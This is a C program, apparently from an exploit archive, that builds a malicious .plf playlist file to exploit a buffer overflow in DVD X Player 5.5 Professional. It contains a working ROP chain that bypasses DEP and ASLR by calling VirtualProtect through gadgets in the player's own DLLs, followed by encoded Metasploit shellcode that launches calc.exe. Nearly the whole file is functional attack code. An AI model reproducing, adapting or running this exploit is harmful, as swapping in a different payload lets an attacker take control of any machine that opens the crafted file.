// # Author: sickness
// # Take a look at mona.py :) awesome tool developed by corelanc0d3r and his team: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
// # -----------------------------------------------------------
// # Exploit Title: DVD X Player 5.5 Professional (.plf) Universal DEP + ASLR BYPASS
// # Software Download: http://www.dvd-x-player.com/download.html#dvdPlayer
// # Date: 30/08/2011
// # PoC: http://www.exploit-db.com/exploits/17745/
// # Tested on: Windows XP SP2, Windows XP SP3, Windows 7
// # Testers: _ming, g0tmi1k, corelanc0d3r, ryujin, sinn3r O_o.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

main()
{

	char rop[] =    "\x02\x67\x62\x61" // # POP EAX # RETN [EPG.dll] 
			"\x90\x90\x90\x90" // # PADDING
			"\x90\x90\x90\x90" // # PADDING
			"\x90\x90\x90\x90" // # PADDING
			"\x90\x90\x90\x90" // # PADDING
			"\x08\x11\x01\x10" // # POINTER TO VirtualProtect() [IAT SkinScrollBar.Dll]
			"\xed\x06\x63\x61" // # MOV EAX,DWORD PTR DS:[EAX] # RETN [EPG.dll] 
			"\xd8\x85\x63\x61" // # XCHG EAX,ESI # RETN 00 [EPG.dll] 
			"\x02\xd2\x62\x61" // # POP EBP # RETN [EPG.dll] 
			"\xc8\xca\x60\x61" // # PUSH ESP [EPG.dll]
			"\x02\x67\x62\x61" // # POP EAX # RETN [EPG.dll] 
			"\xff\xfa\xff\xff" // # AFTER NEGATE --> 0x00000501
			"\x9c\x7d\x62\x61" // # NEG EAX # RETN [EPG.dll] 
			"\x24\x01\x64\x61" // # XCHG EAX,EBX # RETN [EPG.dll] 
			"\x02\x67\x62\x61" // # POP EAX # RETN [EPG.dll] 
			"\xc0\xff\xff\xff" // # AFTER NEGATE --> 0x00000040
			"\x9c\x7d\x62\x61" // # NEG EAX # RETN [EPG.dll]
			"\xa2\x8b\x60\x61" // # XCHG EAX,EDX # RETN [EPG.dll] 
			"\x04\xb8\x60\x61" // # POP ECX # RETN [EPG.dll] 
			"\x01\xb0\x64\x61" // # WRITABLE LOCATION [EPG.dll]
			"\x87\xe5\x62\x61" // # POP EDI # RETN [EPG.dll] 
			"\x1d\x08\x63\x61" // # RETN (ROP NOP) [EPG.dll]
			"\x02\x67\x62\x61" // # POP EAX # RETN [EPG.dll]
			"\x90\x90\x90\x90" // # PADDING
			"\x31\x08\x62\x61"; // # PUSHAD # RETN [EPG.dll]
			
// # msfpayload windows/exec CMD=calc.exe R | msfencode -b "\x00\x0a\x0d\x1a" -t c
// # Around 400 bytes for shellcode :)
	char sc[] =     "\xba\x7a\x70\x9a\xd3\xd9\xc0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
			"\x33\x31\x56\x12\x83\xc6\x04\x03\x2c\x7e\x78\x26\x2c\x96\xf5"
			"\xc9\xcc\x67\x66\x43\x29\x56\xb4\x37\x3a\xcb\x08\x33\x6e\xe0"
			"\xe3\x11\x9a\x73\x81\xbd\xad\x34\x2c\x98\x80\xc5\x80\x24\x4e"
			"\x05\x82\xd8\x8c\x5a\x64\xe0\x5f\xaf\x65\x25\xbd\x40\x37\xfe"
			"\xca\xf3\xa8\x8b\x8e\xcf\xc9\x5b\x85\x70\xb2\xde\x59\x04\x08"
			"\xe0\x89\xb5\x07\xaa\x31\xbd\x40\x0b\x40\x12\x93\x77\x0b\x1f"
			"\x60\x03\x8a\xc9\xb8\xec\xbd\x35\x16\xd3\x72\xb8\x66\x13\xb4"
			"\x23\x1d\x6f\xc7\xde\x26\xb4\xba\x04\xa2\x29\x1c\xce\x14\x8a"
			"\x9d\x03\xc2\x59\x91\xe8\x80\x06\xb5\xef\x45\x3d\xc1\x64\x68"
			"\x92\x40\x3e\x4f\x36\x09\xe4\xee\x6f\xf7\x4b\x0e\x6f\x5f\x33"
			"\xaa\xfb\x4d\x20\xcc\xa1\x1b\xb7\x5c\xdc\x62\xb7\x5e\xdf\xc4"
			"\xd0\x6f\x54\x8b\xa7\x6f\xbf\xe8\x58\x3a\xe2\x58\xf1\xe3\x76"
			"\xd9\x9c\x13\xad\x1d\x99\x97\x44\xdd\x5e\x87\x2c\xd8\x1b\x0f"
			"\xdc\x90\x34\xfa\xe2\x07\x34\x2f\x81\xc6\xa6\xb3\x68\x6d\x4f"
			"\x51\x75";


	char *exploit=malloc(900),*junk=malloc(260),*junk2=malloc(15),*junk3=malloc(20);
	memset(junk,0x41,260);
	memset(junk2,0x90,15);
	memset(junk3,0x90,20);
	strcpy(exploit,junk);
	strcat(exploit,rop);
	strcat(exploit,junk2);
	strcat(exploit,sc);
	strcat(exploit,junk3);


	printf("\nDVD X Player Professional/Standard 5.5\n");
	printf("Author: sickness\n");
	printf("Creating malicious .plf file, please wait.\n");
	usleep(50000);

	FILE *evil;
	evil=fopen("malicious.plf","w");
	fwrite(exploit,1,900,evil);
	fclose(evil);
	printf("File created!\n\n");

	return 0;
}
